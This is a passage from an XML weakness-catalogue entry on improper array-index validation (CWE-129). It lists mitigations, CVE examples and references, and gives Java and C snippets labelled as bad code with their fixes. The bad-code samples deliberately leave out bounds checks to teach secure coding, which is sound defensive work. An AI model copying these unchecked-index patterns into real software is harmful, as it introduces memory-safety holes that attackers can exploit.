            <Detection_Method>
               <Method_Name>Black Box</Method_Name>
               <Method_Description>
                  <Text>Black box methods might not get the needed code coverage within
							limited time constraints, and a dynamic test might not produce any
							noticeable side effects even if it is successful.</Text>
               </Method_Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-7">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Input Validation</Mitigation_Strategy>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use an input validation framework such as Struts or the OWASP ESAPI
							Validation API. If you use Struts, be mindful of weaknesses covered by
							the CWE-101 category.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For any security checks that are performed on the client side, ensure
							that these checks are duplicated on the server side, in order to avoid
							CWE-602. Attackers can bypass the client-side checks by modifying values
							after the checks have been performed, or by changing the client to
							remove the client-side checks entirely. Then, these modified values
							would be submitted to the server.</Text>
                  <Text>Even though client-side checks provide minimal benefits with respect
							to server-side security, they are still useful. First, they can support
							intrusion detection. If the server receives input that should have been
							rejected by the client, then it may be an indication of an attack.
							Second, client-side error-checking can provide helpful feedback to the
							user about the expectations for valid input. Third, there may be a
							reduction in server-side processing time for accidental input errors,
							although this is typically a small savings.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-3">
               <Mitigation_Phase>Requirements</Mitigation_Phase>
               <Mitigation_Strategy>Language Selection</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a language that does not allow this weakness to occur or provides
							constructs that make this weakness easier to avoid.</Text>
                  <Text>For example, Ada allows the programmer to constrain the values of a
							variable and languages such as Java and Ruby will allow the programmer
							to handle exceptions when an out-of-bounds index is accessed. </Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-11">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run or compile the software using features or extensions that randomly
							arrange the positions of a program's executable and libraries in memory.
							Because this makes the addresses unpredictable, it can prevent an
							attacker from reliably jumping to exploitable code.</Text>
                  <Text>Examples include Address Space Layout Randomization (ASLR) [R.129.3]
							[R.129.4] and Position-Independent Executables (PIE) [R.129.8].</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Defense in Depth</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This is not a complete solution. However, it forces the attacker to
							guess an unknown value that changes every program execution. In
							addition, an attack could still cause a denial of service, since the
							typical response is to exit the application.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-12">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a CPU and operating system that offers Data Execution Protection
							(NX) or its equivalent [R.129.4] [R.129.5].</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Defense in Depth</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This is not a complete solution, since buffer overflows could be used
							to overwrite nearby variables to modify the software's state in
							dangerous ways. In addition, it cannot be used in cases in which
							self-modifying code is required. Finally, an attack could still cause a
							denial of service, since the typical response is to exit the
							application.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Input Validation</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Assume all input is malicious. Use an "accept known good" input
							validation strategy, i.e., use a whitelist of acceptable inputs that
							strictly conform to specifications. Reject any input that does not
							strictly conform to specifications, or transform it into something that
							does.</Text>
                  <Text>When performing input validation, consider all potentially relevant
							properties, including length, type of input, the full range of
							acceptable values, missing or extra inputs, syntax, consistency across
							related fields, and conformance to business rules. As an example of
							business rule logic, "boat" may be syntactically valid because it only
							contains alphanumeric characters, but it is not valid if the input is
							only expected to contain colors such as "red" or "blue."</Text>
                  <Text>Do not rely exclusively on looking for malicious or malformed inputs
							(i.e., do not rely on a blacklist). A blacklist is likely to miss at
							least one undesirable input, especially if the code's environment
							changes. This can give attackers enough room to bypass the intended
							validation. However, blacklists can be useful for detecting potential
							attacks or determining which inputs are so malformed that they should be
							rejected outright.</Text>
                  <Text>When accessing a user-controlled array index, use a stringent range of
							values that are within the target array. Make sure that you do not allow
							negative values to be used. That is, verify the minimum as well as the
							maximum of the range of acceptable values.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-35">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Be especially careful to validate all input when invoking code that
							crosses language boundaries, such as from an interpreted language to
							native code. This could create an unexpected interaction between the
							language boundaries. Ensure that you are not violating any of the
							expectations of the language with which you are interfacing. For
							example, even though Java may not be susceptible to buffer overflows,
							providing a large argument in a call to native code might trigger an
							overflow.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run your code using the lowest privileges that are required to
							accomplish the necessary tasks [R.129.6]. If possible, create isolated
							accounts with limited privileges that are only used for a single task.
							That way, a successful attack will not immediately give the attacker
							access to the rest of the software or its environment. For example,
							database applications rarely need to run as the database administrator,
							especially in day-to-day operations.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Sandbox or Jail</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run the code in a "jail" or similar sandbox environment that enforces
							strict boundaries between the process and the operating system. This may
							effectively restrict which files can be accessed in a particular
							directory or which commands can be executed by the software.</Text>
                  <Text>OS-level examples include the Unix chroot jail, AppArmor, and SELinux.
							In general, managed code may provide some protection. For example,
							java.io.FilePermission in the Java SecurityManager allows the software
							to specify restrictions on file operations.</Text>
                  <Text>This may not be a feasible solution, and it only limits the impact to
							the operating system; the rest of the application may still be subject
							to compromise.</Text>
                  <Text>Be careful to avoid CWE-243 and other weaknesses related to jails.
						</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Limited</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>The effectiveness of this mitigation depends on the prevention
							capabilities of the specific sandbox or jail being used and might only
							help to reduce the scope of an attack, such as restricting the attacker
							to certain system calls or limiting the portion of the file system that
							can be accessed. </Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Causal_Nature>Explicit</Causal_Nature>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the code snippet below, an untrusted integer value is used to
						reference an object in an array.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>public String getValue(int index) {</Code>
                     <Block>
                        <Code>return array[index];</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>If index is outside of the range of the array, this may result in an
							ArrayIndexOutOfBounds Exception being raised.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-34">
               <Intro_Text>The following example takes a user-supplied value to allocate an
						array of objects and then operates on the array.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>private void buildList ( int untrustedListSize ){</Code>
                     <Block>
                        <Code>if ( 0 &gt; untrustedListSize ){</Code>
                        <Block>
                           <Code>die("Negative value supplied for list size, die evil
										hacker!");</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>Widget[] list = new Widget [ untrustedListSize ];</Code>
                        <Code>list[0] = new Widget();</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>This example attempts to build a list from a user-specified value, and
							even checks to ensure a non-negative value is supplied. If, however, a 0
							value is provided, the code will build an array of size 0 and then try
							to store a new Widget in the first location, causing an exception to be
							thrown.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-100">
               <Intro_Text>In the following code, the method retrieves a value from an array at
						a specific array index location that is given as an input parameter to the
						method</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>int getValueFromArray(int *array, int len, int index) {</Code>
                     <Block>
                        <Code/>
                        <Code>int value;</Code>
                        <Code/>
                        <Comment>// check that the array index is less than the
									maximum</Comment>
                        <Comment>// length of the array</Comment>
                        <Code>if (index &lt; len) {</Code>
                        <Block>
                           <Code/>
                           <Comment>// get the value at the specified index of the
										array</Comment>
                           <Code>value = array[index];</Code>
                        </Block>
                        <Code>}</Code>
                        <Comment>// if array index is invalid then output error
									message</Comment>
                        <Comment>// and return value indicating error</Comment>
                        <Code>else {</Code>
                        <Block>
                           <Code>printf("Value is: %d\n", array[index]);</Code>
                           <Code>value = -1;</Code>
                        </Block>
                        <Code>}</Code>
                        <Code/>
                        <Code>return value;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>However, this method only verifies that the given array index is less
							than the maximum length of the array but does not check for the minimum
							value (CWE-839). This will allow a negative value to be accepted as the
							input array index, which will result in a out of bounds read (CWE-125)
							and may allow access to sensitive memory. The input array index should
							be checked to verify that is within the maximum and minimum range
							required for the array (CWE-129). In this example the if statement
							should be modified to include a minimum range check, as shown
							below.</Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code/>
                     <Code>...</Code>
                     <Code/>
                     <Comment>// check that the array index is within the correct</Comment>
                     <Comment>// range of values for the array</Comment>
                     <Code>if (index &gt;= 0 &amp;&amp; index &lt; len)
								{</Code>
                     <Code/>
                     <Code>...</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following example retrieves the sizes of messages for a pop3
						mail server. The message sizes are retrieved from a socket that returns in a
						buffer the message number and the message size, the message number (num) and
						size (size) are extracted from the buffer and the message size is placed
						into an array using the message number for the array index.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Comment>/* capture the sizes of all messages */</Comment>
                     <Code>int getsizes(int sock, int count, int *sizes) {</Code>
                     <Block>
                        <Code>...</Code>
                        <Code>char buf[BUFFER_SIZE];</Code>
                        <Code>int ok;</Code>
                        <Code>int num, size;</Code>
                        <Code/>
                        <Comment>// read values from socket and added to sizes
									array</Comment>
                        <Code>while ((ok = gen_recv(sock, buf, sizeof(buf))) == 0)</Code>
                        <Code>{</Code>
                        <Block>
                           <Code/>
                           <Comment>// continue read from socket until buf only contains
										'.'</Comment>
                           <Code>if (DOTLINE(buf))</Code>
                           <Block>
                              <Code>break;</Code>
                           </Block>
                           <Code>else if (sscanf(buf, "%d %d", &amp;num, &amp;size)
										== 2)</Code>
                           <Block>
                              <Code>sizes[num - 1] = size;</Code>
                           </Block>
                        </Block>
                        <Code> }</Code>
                        <Block>
                           <Code>...</Code>
                        </Block>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>In this example the message number retrieved from the buffer could be
							a value that is outside the allowable range of indices for the array and
							could possibly be a negative number. Without proper validation of the
							value to be used for the array index an array overflow could occur and
							could potentially lead to unauthorized access to memory addresses and
							system crashes. The value of the array index should be validated to
							ensure that it is within the allowable range of indices for the array as
							in the following code.</Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Comment>/* capture the sizes of all messages */</Comment>
                     <Code>int getsizes(int sock, int count, int *sizes) {</Code>
                     <Block>
                        <Code>...</Code>
                        <Code>char buf[BUFFER_SIZE];</Code>
                        <Code>int ok;</Code>
                        <Code>int num, size;</Code>
                        <Code/>
                        <Comment>// read values from socket and added to sizes
									array</Comment>
                        <Code>while ((ok = gen_recv(sock, buf, sizeof(buf))) == 0)</Code>
                        <Code>{</Code>
                        <Block>
                           <Code/>
                           <Comment>// continue read from socket until buf only contains
										'.'</Comment>
                           <Code>if (DOTLINE(buf))</Code>
                           <Block>
                              <Code>break;</Code>
                           </Block>
                           <Code>else if (sscanf(buf, "%d %d", &amp;num, &amp;size)
										== 2) {</Code>
                           <Block>
                              <Code>if (num &gt; 0 &amp;&amp; num &lt;=
											(unsigned)count)</Code>
                              <Block>
                                 <Code>sizes[num - 1] = size;</Code>
                              </Block>
                              <Code>else</Code>
                              <Block>
                                 <Comment>/* warn about possible attempt to induce buffer
												overflow */</Comment>
                                 <Code>report(stderr, "Warning: ignoring bogus data for
												message sizes returned by server.\n");</Code>
                              </Block>
                           </Block>
                           <Code>}</Code>
                        </Block>
                        <Code> }</Code>
                        <Block>
                           <Code>...</Code>
                        </Block>
                     </Block>
                     <Code>}</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the following example the method displayProductSummary is called
						from a Web service servlet to retrieve product summary information for
						display to the user. The servlet obtains the integer value of the product
						number from the user and passes it to the displayProductSummary method. The
						displayProductSummary method passes the integer value of the product number
						to the getProductSummary method which obtains the product summary from the
						array object containing the project summaries using the integer value of the
						product number as the array index.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Comment>// Method called from servlet to obtain product
								information</Comment>
                     <Code>public String displayProductSummary(int index) {</Code>
                     <Code/>
                     <Block>
                        <Code>String productSummary = new String("");</Code>
                        <Code/>
                        <Code>try {</Code>
                        <Block>
                           <Code>String productSummary = getProductSummary(index);</Code>
                        </Block>
                        <Code/>
                        <Code>} catch (Exception ex) {...}</Code>
                        <Code/>
                        <Code>return productSummary; </Code>
                     </Block>
                     <Code>}</Code>
                     <Code/>
                     <Code>public String getProductSummary(int index) {</Code>
                     <Block>
                        <Code>return products[index];</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>In this example the integer value used as the array index that is
							provided by the user may be outside the allowable range of indices for
							the array which may provide unexpected results or cause the application
							to fail. The integer value used for the array index should be validated
							to ensure that it is within the allowable range of indices for the array
							as in the following code.</Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Comment>// Method called from servlet to obtain product
								information</Comment>
                     <Code>public String displayProductSummary(int index) {</Code>
                     <Code/>
                     <Block>
                        <Code>String productSummary = new String("");</Code>
                        <Code/>
                        <Code>try {</Code>
                        <Block>
                           <Code>String productSummary = getProductSummary(index);</Code>
                        </Block>
                        <Code/>
                        <Code>} catch (Exception ex) {...}</Code>
                        <Code/>
                        <Code>return productSummary; </Code>
                     </Block>
                     <Code>}</Code>
                     <Code/>
                     <Code>public String getProductSummary(int index) {</Code>
                     <Block>
                        <Code>String productSummary = "";</Code>
                        <Code/>
                        <Code>if ((index &gt;= 0) &amp;&amp; (index &lt;
									MAX_PRODUCTS)) {</Code>
                        <Block>
                           <Code>productSummary = products[index];</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>else {</Code>
                        <Block>
                           <Code>System.err.println("index is out of bounds");</Code>
                           <Code>throw new IndexOutOfBoundsException();</Code>
                        </Block>
                        <Code>}</Code>
                        <Code/>
                        <Code>return productSummary;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>An alternative in Java would be to use one of the collection objects
							such as ArrayList that will automatically generate an exception if an
							attempt is made to access an array index that is out of bounds.</Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>ArrayList productArray = new ArrayList(MAX_PRODUCTS);</Code>
                     <Code>...</Code>
                     <Code>try {</Code>
                     <Block>
                        <Code>productSummary = (String) productArray.get(index);</Code>
                     </Block>
                     <Code>} catch (IndexOutOfBoundsException ex) {...}</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-90">
               <Intro_Text>The following example asks a user for an offset into an array to
						select an item.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code/>
                     <Code>int main (int argc, char **argv) {</Code>
                     <Block>
                        <Code>char *items[] = {"boat", "car", "truck", "train"};</Code>
                        <Code>int index = GetUntrustedOffset();</Code>
                        <Code>printf("You selected %s\n", items[index-1]);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>The programmer allows the user to specify which element in the list to
							select, however an attacker can provide an out-of-bounds offset,
							resulting in a buffer over-read (CWE-126).</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-0369</Observed_Example_Reference>
               <Observed_Example_Description>large ID in packet used as array
						index</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2001-1009</Observed_Example_Reference>
               <Observed_Example_Description>negative array index as argument to POP LIST
						command</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2003-0721</Observed_Example_Reference>
               <Observed_Example_Description>Integer signedness error leads to negative array
						index</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-1189</Observed_Example_Reference>
               <Observed_Example_Description>product does not properly track a count and a
						maximum number, which can lead to resultant array index
						overflow.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-5756</Observed_Example_Reference>
               <Observed_Example_Description>Chain: device driver for packet-capturing software
						allows access to an unintended IOCTL with resultant array index
						error.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-2456</Observed_Example_Reference>
               <Observed_Example_Description>Chain: array index error (CWE-129) leads to
						deadlock (CWE-833)</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Theoretical_Notes>
            <Theoretical_Note>
               <Text> An improperly validated array index might lead directly to the
						always-incorrect behavior of "access of array using out-of-bounds index."
					</Text>
            </Theoretical_Note>
         </Theoretical_Notes>
         <Affected_Resources>
            <Affected_Resource>Memory</Affected_Resource>
         </Affected_Resources>
         <References>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.129.1">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 5, "Array Indexing Errors" Page
						144</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Local_Reference_ID="R.129.2">
               <Reference_Author>Jason Lam</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 14 - Improper Validation of Array
						Index</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-12</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/03/12/top-25-series-rank-14-improper-validation-of-array-index/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-22" Local_Reference_ID="R.129.3">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Title>Address Space Layout Randomization in Windows
						Vista</Reference_Title>
               <Reference_Link>http://blogs.msdn.com/michael_howard/archive/2006/05/26/address-space-layout-randomization-in-windows-vista.aspx</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-29" Local_Reference_ID="R.129.4">
               <Reference_Title>PaX</Reference_Title>
               <Reference_Link>http://en.wikipedia.org/wiki/PaX</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-25" Local_Reference_ID="R.129.5">
               <Reference_Author>Microsoft</Reference_Author>
               <Reference_Title>Understanding DEP as a mitigation technology part
						1</Reference_Title>
               <Reference_Link>http://blogs.technet.com/b/srd/archive/2009/06/12/understanding-dep-as-a-mitigation-technology-part-1.aspx</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-31" Local_Reference_ID="R.129.6">
               <Reference_Author>Sean Barnum</Reference_Author>
               <Reference_Author>Michael Gegick</Reference_Author>
               <Reference_Title>Least Privilege</Reference_Title>
               <Reference_PubDate>2005-09-14</Reference_PubDate>
               <Reference_Link>https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-17" Local_Reference_ID="R.129.7">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 5: Buffer Overruns." Page 89</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-37" Local_Reference_ID="R.129.8">
               <Reference_Author>Grant Murphy</Reference_Author>
               <Reference_Title>Position Independent Executables (PIE)</Reference_Title>
               <Reference_Publisher>Red Hat</Reference_Publisher>
               <Reference_Date>2012-11-28</Reference_Date>
               <Reference_Link>https://securityblog.redhat.com/2012/11/28/position-independent-executables-pie/</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CLASP">
               <Mapped_Node_Name>Unchecked array indexing</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>INDEX - Array index overflow</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Understand how arrays work</Mapped_Node_Name>
               <Mapped_Node_ID>ARR00-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Guarantee that array indices are within the valid
						range</Mapped_Node_Name>
               <Mapped_Node_ID>ARR30-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Do not add or subtract an integer to a pointer if the
						resulting value does not refer to a valid array element</Mapped_Node_Name>
               <Mapped_Node_ID>ARR38-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Ensure that operations on signed integers do not result in
						overflow</Mapped_Node_Name>
               <Mapped_Node_ID>INT32-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Do not assume a positive remainder when using the %
						operator</Mapped_Node_Name>
               <Mapped_Node_ID>INT10-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Ensure that operations on signed integers do not result in
						overflow</Mapped_Node_Name>
               <Mapped_Node_ID>INT32-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Understand when to prefer vectors over
						arrays</Mapped_Node_Name>
               <Mapped_Node_ID>ARR00-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Guarantee that array and vector indices are within the valid
						range</Mapped_Node_Name>
               <Mapped_Node_ID>ARR30-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Do not add or subtract an integer to a pointer or iterator if
						the resulting value does not refer to a valid element in the array or
						container</Mapped_Node_Name>
               <Mapped_Node_ID>ARR38-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Faulty Buffer Access</Mapped_Node_Name>
               <Mapped_Node_ID>SFP8</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>100</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>CLASP</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Sean Eidemiller</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative
						examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms,
						Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings,
						Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Description, Name,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences,
						Observed_Examples, Other_Notes, Potential_Mitigations, Theoretical_Notes,
						Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples,
						Detection_Factors, Likelihood_of_Exploit, Potential_Mitigations, References,
						Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationship_Notes,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples,
						Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples,
						Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations,
						References, Relationships</Modification_Comment>
            </Modification>
